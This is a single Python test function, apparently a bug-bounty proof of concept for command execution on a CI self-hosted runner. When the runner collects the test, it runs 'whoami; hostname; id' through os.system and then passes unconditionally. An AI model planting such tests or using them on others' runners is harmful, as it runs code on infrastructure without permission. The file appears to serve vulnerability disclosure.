    def test_poc_runner_rce():
        import os
        print("POC by Humaira - self-hosted runner")
        os.system("whoami; hostname; id")
        assert True
